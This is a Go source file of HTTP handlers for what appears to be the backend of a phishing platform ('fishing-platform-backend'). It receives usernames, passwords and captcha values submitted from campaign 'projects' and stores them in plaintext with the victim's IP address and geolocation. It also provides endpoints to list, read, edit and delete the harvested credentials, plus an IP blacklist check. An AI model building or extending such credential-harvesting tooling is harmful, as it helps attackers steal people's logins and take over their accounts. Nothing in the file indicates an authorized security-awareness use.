package handlers

import (
	"net"
	"net/http"
	"strings"

	"fishing-platform-backend/config"
	"fishing-platform-backend/models"
	"fishing-platform-backend/utils"
	"github.com/gin-gonic/gin"
)

type credentialPayload struct {
	ProjectID    uint   `json:"project_id" form:"project_id"`
	Project      uint   `json:"project" form:"project"`
	Username     string `json:"username" form:"username"`
	Password     string `json:"password" form:"password"`
	CaptchaValue string `json:"captchavalue" form:"captchavalue"`
	IPAddress    string `json:"ip_address" form:"ip_address"`
}

func normalizeSubmittedIP(value string) string {
	for _, part := range strings.Split(value, ",") {
		candidate := strings.TrimSpace(strings.Trim(part, `"'`))
		if candidate == "" {
			continue
		}

		host := candidate
		if parsedHost, _, err := net.SplitHostPort(candidate); err == nil {
			host = parsedHost
		}
		host = strings.Trim(host, "[]")

		if ip := net.ParseIP(host); ip != nil {
			return ip.String()
		}
	}

	return ""
}

func fillCredentialLocation(credential *models.Credential) {
	if credential.IPLocation != "" || credential.IPAddress == "" {
		return
	}
	credential.IPLocation = utils.LookupIPLocation(credential.IPAddress)
}

func fillCredentialLocations(credentials []models.Credential) {
	for i := range credentials {
		fillCredentialLocation(&credentials[i])
	}
}

// CreateCredential creates a new credential
func CreateCredential(c *gin.Context) {
	var payload credentialPayload
	if err := c.ShouldBind(&payload); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request data"})
		return
	}

	projectID := payload.ProjectID
	if projectID == 0 {
		projectID = payload.Project
	}
	if projectID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Project ID is required"})
		return
	}

	sourceIP := normalizeSubmittedIP(payload.IPAddress)
	if sourceIP == "" {
		sourceIP = c.ClientIP()
	}

	db := config.GetDB()
	if isIPBlacklisted(db, sourceIP) {
		c.JSON(http.StatusForbidden, gin.H{"error": "IP is blacklisted"})
		return
	}

	credential := models.Credential{
		ProjectID:    projectID,
		Username:     payload.Username,
		Password:     payload.Password,
		IPAddress:    sourceIP,
		IPLocation:   utils.LookupIPLocation(sourceIP),
		CaptchaValue: payload.CaptchaValue,
	}

	if err := db.Create(&credential).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create credential"})
		return
	}

	c.JSON(http.StatusCreated, credential)
}

// GetCredentials retrieves all credentials
func GetCredentials(c *gin.Context) {
	db := config.GetDB()
	var credentials []models.Credential

	if err := db.Preload("Project").Find(&credentials).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to retrieve credentials"})
		return
	}

	fillCredentialLocations(credentials)
	c.JSON(http.StatusOK, credentials)
}

// GetCredential retrieves a single credential by ID
func GetCredential(c *gin.Context) {
	id := c.Param("id")
	db := config.GetDB()
	var credential models.Credential

	if err := db.Preload("Project").First(&credential, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Credential not found"})
		return
	}

	fillCredentialLocation(&credential)
	c.JSON(http.StatusOK, credential)
}

// UpdateCredential updates an existing credential
func UpdateCredential(c *gin.Context) {
	id := c.Param("id")
	db := config.GetDB()

	var credential models.Credential
	if err := db.First(&credential, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Credential not found"})
		return
	}

	if err := c.ShouldBindJSON(&credential); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request data"})
		return
	}
	fillCredentialLocation(&credential)

	if err := db.Save(&credential).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update credential"})
		return
	}

	c.JSON(http.StatusOK, credential)
}

// DeleteCredential deletes a credential
func DeleteCredential(c *gin.Context) {
	id := c.Param("id")
	db := config.GetDB()

	var credential models.Credential
	if err := db.First(&credential, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Credential not found"})
		return
	}

	if err := db.Delete(&credential).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to delete credential"})
		return
	}

	c.JSON(http.StatusNoContent, nil)
}
